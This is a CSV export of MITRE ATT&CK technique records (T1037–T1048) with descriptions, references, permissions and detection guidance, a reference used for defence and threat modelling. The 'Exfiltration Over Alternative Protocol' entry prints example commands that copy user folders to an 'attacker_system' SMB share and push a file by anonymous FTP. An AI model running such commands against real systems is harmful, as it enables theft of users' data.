created,created_by_ref,description,external_references,id,kill_chain_phases,modified,name,object_marking_refs,revoked,type,x_mitre_contributors,x_mitre_data_sources,x_mitre_defense_bypassed,x_mitre_deprecated,x_mitre_detectable_by_common_defenses,x_mitre_detectable_by_common_defenses_explanation,x_mitre_detection,x_mitre_difficulty_for_adversary,x_mitre_difficulty_for_adversary_explanation,x_mitre_effective_permissions,x_mitre_impact_type,x_mitre_network_requirements,x_mitre_old_attack_id,x_mitre_permissions_required,x_mitre_platforms,x_mitre_remote_support,x_mitre_system_requirements,x_mitre_tactic_type,x_mitre_version
2017-05-31 21:30:44.720000+00:00,identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5,"Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different channels could include Internet Web services such as cloud storage.

Adversaries may leverage various operating system utilities to exfiltrate data over an alternative protocol. 

SMB command-line example:

* <code>net use \\\attacker_system\IPC$ /user:username password && xcopy /S /H /C /Y C:\Users\\* \\\attacker_system\share_folder\</code>

Anonymous FTP command-line example:(Citation: Palo Alto OilRig Oct 2016)

* <code>echo PUT C:\Path\to\file.txt | ftp -A attacker_system</code>
","[ExternalReference(source_name='mitre-attack', url='https://attack.mitre.org/techniques/T1048', external_id='T1048'), ExternalReference(source_name='Palo Alto OilRig Oct 2016', description='Grunzweig, J. and Falcone, R.. (2016, October 4). OilRig Malware Campaign Updates Toolset and Expands Targets. Retrieved May 3, 2017.', url='http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/'), ExternalReference(source_name='University of Birmingham C2', description='Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', url='https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf')]",attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776,"[KillChainPhase(kill_chain_name='mitre-attack', phase_name='exfiltration')]",2019-09-18 12:50:17.488000+00:00,Exfiltration Over Alternative Protocol,['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'],False,attack-pattern,['Alfredo Abarca'],"['User interface', 'Process monitoring', 'Process use of network', 'Packet capture', 'Netflow/Enclave netflow', 'Network protocol analysis']",,,,,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",,,,,True,,,"['Linux', 'macOS', 'Windows']",,,,1.1
2017-05-31 21:30:44.329000+00:00,identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5,"Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)

An adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI 2015)","[ExternalReference(source_name='mitre-attack', url='https://attack.mitre.org/techniques/T1047', external_id='T1047'), ExternalReference(source_name='Wikipedia SMB', description='Wikipedia. (2016, June 12). Server Message Block. Retrieved June 12, 2016.', url='https://en.wikipedia.org/wiki/Server_Message_Block'), ExternalReference(source_name='TechNet RPC', description='Microsoft. (2003, March 28). What Is RPC?. Retrieved June 12, 2016.', url='https://technet.microsoft.com/en-us/library/cc787851.aspx'), ExternalReference(source_name='MSDN WMI', description='Microsoft. (n.d.). Windows Management Instrumentation. Retrieved April 27, 2016.', url='https://msdn.microsoft.com/en-us/library/aa394582.aspx'), ExternalReference(source_name='FireEye WMI 2015', description='Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.', url='https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf')]",attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055,"[KillChainPhase(kill_chain_name='mitre-attack', phase_name='execution')]",2019-07-17 20:04:40.297000+00:00,Windows Management Instrumentation,['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'],False,attack-pattern,,"['Authentication logs', 'Netflow/Enclave netflow', 'Process monitoring', 'Process command-line parameters']",,,,,"Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of ""wmic"" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)",,,,,,,"['User', 'Administrator']",['Windows'],True,"['WMI service, winmgmt, running.\nHost/network firewalls allowing SMB and WMI ports from source to destination.\nSMB authentication.']",,1.0
2017-05-31 21:30:43.915000+00:00,identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5,"Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. 

Within cloud environments, adversaries may attempt to discover services running on other cloud hosts or cloud services enabled within the environment. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems.","[ExternalReference(source_name='mitre-attack', url='https://attack.mitre.org/techniques/T1046', external_id='T1046'), ExternalReference(source_name='capec', url='https://capec.mitre.org/data/definitions/300.html', external_id='CAPEC-300')]",attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88,"[KillChainPhase(kill_chain_name='mitre-attack', phase_name='discovery')]",2019-10-23 14:20:49.573000+00:00,Network Service Scanning,['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'],False,attack-pattern,['Praetorian'],"['Netflow/Enclave netflow', 'Network protocol analysis', 'Packet capture', 'Process command-line parameters', 'Process use of network']",,,,,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Normal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans.",,,,,,,"['Administrator', 'SYSTEM', 'User']","['Linux', 'Windows', 'macOS', 'AWS', 'GCP', 'Azure']",,,,2
2017-05-31 21:30:43.472000+00:00,identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5,"Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.

Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.

Adversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018)","[ExternalReference(source_name='mitre-attack', url='https://attack.mitre.org/techniques/T1045', external_id='T1045'), ExternalReference(source_name='capec', url='https://capec.mitre.org/data/definitions/570.html', external_id='CAPEC-570'), ExternalReference(source_name='Wikipedia Exe Compression', description='Executable compression. (n.d.). Retrieved December 4, 2014.', url='http://en.wikipedia.org/wiki/Executable_compression'), ExternalReference(source_name='ESET FinFisher Jan 2018', description=""Kafka, F. (2018, January). ESET's Guide to Deobfuscating and Devirtualizing FinFisher. Retrieved August 12, 2019."", url='https://www.welivesecurity.com/wp-content/uploads/2018/01/WP-FinFisher.pdf')]",attack-pattern--6ff403bc-93e3-48be-8687-e102fdba8c88,"[KillChainPhase(kill_chain_name='mitre-attack', phase_name='defense-evasion')]",2019-09-26 15:56:47.231000+00:00,Software Packing,['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'],False,attack-pattern,"['Filip Kafka, ESET']",['Binary file metadata'],"['Signature-based detection', 'Anti-virus', 'Heuristic detection']",,,,"Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.",,,,,,,,"['Windows', 'macOS']",,,,1.1
2017-05-31 21:30:43.063000+00:00,identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5,"Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

### Services

Manipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.

### Executable Installers

Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)","[ExternalReference(source_name='mitre-attack', url='https://attack.mitre.org/techniques/T1044', external_id='T1044'), ExternalReference(source_name='capec', url='https://capec.mitre.org/data/definitions/17.html', external_id='CAPEC-17'), ExternalReference(source_name='Mozilla Firefox Installer DLL Hijack', description='Kugler, R. (2012, November 20). Mozilla Foundation Security Advisory 2012-98. Retrieved March 10, 2017.', url='https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/'), ExternalReference(source_name='Seclists Kanthak 7zip Installer', description='Kanthak, S. (2015, December 8). Executable installers are vulnerable^WEVIL (case 7): 7z*.exe\tallows remote code execution with escalation of privilege. Retrieved March 10, 2017.', url='http://seclists.org/fulldisclosure/2015/Dec/34')]",attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a,"[KillChainPhase(kill_chain_name='mitre-attack', phase_name='persistence'), KillChainPhase(kill_chain_name='mitre-attack', phase_name='privilege-escalation')]",2019-07-17 21:22:37.100000+00:00,File System Permissions Weakness,['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'],False,attack-pattern,"['Stefan Kanthak', 'Travis Smith, Tripwire']","['File monitoring', 'Services', 'Process command-line parameters']",,,,,"Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.

Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.",,,"['SYSTEM', 'User', 'Administrator']",,,,"['Administrator', 'User']",['Windows'],,,,1.0
2017-05-31 21:30:42.657000+00:00,identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5,"Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as

* TCP:80 (HTTP)
* TCP:443 (HTTPS)
* TCP:25 (SMTP)
* TCP/UDP:53 (DNS)

They may use the protocol associated with the port or a completely different protocol. 

For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are 

* TCP/UDP:135 (RPC)
* TCP/UDP:22 (SSH)
* TCP/UDP:3389 (RDP)","[ExternalReference(source_name='mitre-attack', url='https://attack.mitre.org/techniques/T1043', external_id='T1043'), ExternalReference(source_name='University of Birmingham C2', description='Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', url='https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf')]",attack-pattern--f879d51c-5476-431c-aedf-f14d207e4d1e,"[KillChainPhase(kill_chain_name='mitre-attack', phase_name='command-and-control')]",2019-07-16 20:51:40.305000+00:00,Commonly Used Port,['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'],False,attack-pattern,,"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",,,,,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",,,,,True,,,"['Linux', 'macOS', 'Windows']",,,,1.0
2017-05-31 21:30:42.222000+00:00,identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5,"When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access (Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.

System file associations are listed under <code>HKEY_CLASSES_ROOT\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\[handler]\shell\[action]\command</code>. For example:
* <code>HKEY_CLASSES_ROOT\txtfile\shell\open\command</code>
* <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code>
* <code>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</code>

The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012)","[ExternalReference(source_name='mitre-attack', url='https://attack.mitre.org/techniques/T1042', external_id='T1042'), ExternalReference(source_name='capec', url='https://capec.mitre.org/data/definitions/556.html', external_id='CAPEC-556'), ExternalReference(source_name='Microsoft File Handlers', description='Microsoft. (n.d.). Specifying File Handlers for File Name Extensions. Retrieved November 13, 2014.', url='http://msdn.microsoft.com/en-us/library/bb166549.aspx'), ExternalReference(source_name='Microsoft Change Default Programs', description='Microsoft. (n.d.). Change which programs Windows 7 uses by default. Retrieved July 26, 2016.', url='https://support.microsoft.com/en-us/help/18539/windows-7-change-default-programs'), ExternalReference(source_name='Microsoft Assoc Oct 2017', description='Plett, C. et al.. (2017, October 15). assoc. Retrieved August 7, 2018.', url='https://docs.microsoft.com/windows-server/administration/windows-commands/assoc'), ExternalReference(source_name='TrendMicro TROJ-FAKEAV OCT 2012', description='Sioting, S. (2012, October 8). TROJ_FAKEAV.GZD. Retrieved August 8, 2018.', url='https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_fakeav.gzd')]",attack-pattern--68c96494-1a50-403e-8844-69a6af278c68,"[KillChainPhase(kill_chain_name='mitre-attack', phase_name='persistence')]",2018-10-17 00:14:20.652000+00:00,Change Default File Association,['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'],False,attack-pattern,"['Stefan Kanthak', 'Travis Smith, Tripwire']","['Windows Registry', 'Process monitoring', 'Process command-line parameters']",,,,,"Collect and analyze changes to Registry keys that associate file extensions to default applications for execution and correlate with unknown process launch activity or unusual file types for that process. 

User file association preferences are stored under <code> [HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts</code> and override associations configured under <code>[HKEY_CLASSES_ROOT]</code>. Changes to a user's preference will occur under this entry's subkeys.

Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.",,,,,,,"['User', 'Administrator', 'SYSTEM']",['Windows'],,,,1.0
2017-05-31 21:30:41.804000+00:00,identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5,Data exfiltration is performed over the Command and Control channel. Data is encoded into the normal communications channel using the same protocol as command and control communications.,"[ExternalReference(source_name='mitre-attack', url='https://attack.mitre.org/techniques/T1041', external_id='T1041'), ExternalReference(source_name='University of Birmingham C2', description='Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', url='https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf')]",attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d,"[KillChainPhase(kill_chain_name='mitre-attack', phase_name='exfiltration')]",2019-07-17 20:19:29.398000+00:00,Exfiltration Over Command and Control Channel,['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'],False,attack-pattern,,"['User interface', 'Process monitoring']",,,,,"Detection for command and control applies. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",,,,,True,,,"['Linux', 'macOS', 'Windows']",,,,1.0
2017-05-31 21:30:41.399000+00:00,identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5,"Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.

Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and Relay](https://attack.mitre.org/techniques/T1171), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.

Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (ex: IP addressing, hostnames, VLAN IDs) necessary for follow-on Lateral Movement and/or Defense Evasion activities.","[ExternalReference(source_name='mitre-attack', url='https://attack.mitre.org/techniques/T1040', external_id='T1040'), ExternalReference(source_name='capec', url='https://capec.mitre.org/data/definitions/158.html', external_id='CAPEC-158')]",attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529,"[KillChainPhase(kill_chain_name='mitre-attack', phase_name='credential-access'), KillChainPhase(kill_chain_name='mitre-attack', phase_name='discovery')]",2019-07-18 16:42:21.548000+00:00,Network Sniffing,['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'],False,attack-pattern,,"['Network device logs', 'Host network interface', 'Netflow/Enclave netflow', 'Process monitoring']",,,,,"Detecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a man-in-the-middle attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.",,,,,,,"['Administrator', 'SYSTEM']","['Linux', 'macOS', 'Windows']",,['Network interface access and packet capture driver'],,1.0
2017-05-31 21:30:41.022000+00:00,identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5,"Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration.

Adversaries may search network shares on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.","[ExternalReference(source_name='mitre-attack', url='https://attack.mitre.org/techniques/T1039', external_id='T1039')]",attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c,"[KillChainPhase(kill_chain_name='mitre-attack', phase_name='collection')]",2018-10-17 00:14:20.652000+00:00,Data from Network Shared Drive,['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'],False,attack-pattern,,"['File monitoring', 'Process monitoring', 'Process command-line parameters']",,,,,Monitor processes and command-line arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1086).,,,,,,,,"['Linux', 'macOS', 'Windows']",,['Privileges to access network shared drive'],,1.0
2017-05-31 21:30:40.604000+00:00,identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5,"Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft DLL Search) Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. 

Adversaries may perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft 2269637) Adversaries may use this behavior to cause the program to load a malicious DLL. 

Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. (Citation: Microsoft DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search Order)

If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.

Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.","[ExternalReference(source_name='mitre-attack', url='https://attack.mitre.org/techniques/T1038', external_id='T1038'), ExternalReference(source_name='capec', url='https://capec.mitre.org/data/definitions/471.html', external_id='CAPEC-471'), ExternalReference(source_name='Microsoft DLL Search', description='Microsoft. (n.d.). Dynamic-Link Library Search Order. Retrieved November 30, 2014.', url='http://msdn.microsoft.com/en-US/library/ms682586'), ExternalReference(source_name='OWASP Binary Planting', description='OWASP. (2013, January 30). Binary planting. Retrieved June 7, 2016.', url='https://www.owasp.org/index.php/Binary_planting'), ExternalReference(source_name='Microsoft 2269637', description='Microsoft. (2010, August 22). Microsoft Security Advisory 2269637 Released. Retrieved December 5, 2014.', url='http://blogs.technet.com/b/msrc/archive/2010/08/21/microsoft-security-advisory-2269637-released.aspx'), ExternalReference(source_name='Microsoft DLL Redirection', description='Microsoft. (n.d.). Dynamic-Link Library Redirection. Retrieved December 5, 2014.', url='http://msdn.microsoft.com/en-US/library/ms682600'), ExternalReference(source_name='Microsoft Manifests', description='Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.', url='https://msdn.microsoft.com/en-US/library/aa375365'), ExternalReference(source_name='Mandiant Search Order', description='Mandiant. (2010, August 31). DLL Search Order Hijacking Revisited. Retrieved December 5, 2014.', url='https://www.mandiant.com/blog/dll-search-order-hijacking-revisited/')]",attack-pattern--46944654-fcc1-4f63-9dad-628102376586,"[KillChainPhase(kill_chain_name='mitre-attack', phase_name='persistence'), KillChainPhase(kill_chain_name='mitre-attack', phase_name='privilege-escalation'), KillChainPhase(kill_chain_name='mitre-attack', phase_name='defense-evasion')]",2019-07-24 15:07:22.266000+00:00,DLL Search Order Hijacking,['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'],False,attack-pattern,"['Stefan Kanthak', 'Travis Smith, Tripwire']","['File monitoring', 'DLL monitoring', 'Process monitoring', 'Process command-line parameters']",['Process whitelisting'],,,,"Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.",,,"['User', 'Administrator', 'SYSTEM']",,,,"['User', 'Administrator', 'SYSTEM']",['Windows'],,"['Ability to add a DLL, manifest file, or .local file, directory, or junction.']",,1.0
2017-05-31 21:30:38.910000+00:00,identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5,"### Windows

Windows allows logon scripts to be run whenever a specific user or group of users log into a system. (Citation: TechNet Logon Scripts) The scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server.

If adversaries can access these scripts, they may insert additional code into the logon script to execute their tools when a user logs in. This code can allow them to maintain persistence on a single system, if it is a local script, or to move laterally within a network, if the script is stored on a central server and pushed to many systems. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.

### Mac

Mac allows login and logoff hooks to be run as root whenever a specific user logs into or out of a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike startup items, a login hook executes as root (Citation: creating login hook). There can only be one login hook at a time though. If adversaries can access these scripts, they can insert additional code to the script to execute their tools when a user logs in.","[ExternalReference(source_name='mitre-attack', url='https://attack.mitre.org/techniques/T1037', external_id='T1037'), ExternalReference(source_name='capec', url='https://capec.mitre.org/data/definitions/564.html', external_id='CAPEC-564'), ExternalReference(source_name='TechNet Logon Scripts', description='Microsoft. (2005, January 21). Creating logon scripts. Retrieved April 27, 2016.', url='https://technet.microsoft.com/en-us/library/cc758918(v=ws.10).aspx'), ExternalReference(source_name='creating login hook', description='Apple. (2011, June 1). Mac OS X: Creating a login hook. Retrieved July 17, 2017.', url='https://support.apple.com/de-at/HT2420')]",attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334,"[KillChainPhase(kill_chain_name='mitre-attack', phase_name='lateral-movement'), KillChainPhase(kill_chain_name='mitre-attack', phase_name='persistence')]",2019-06-24 14:22:07.921000+00:00,Logon Scripts,['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'],False,attack-pattern,,"['File monitoring', 'Process monitoring']",,,,,Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties.,,,,,,,,"['macOS', 'Windows']",,['Write access to system or domain logon scripts'],,1.0
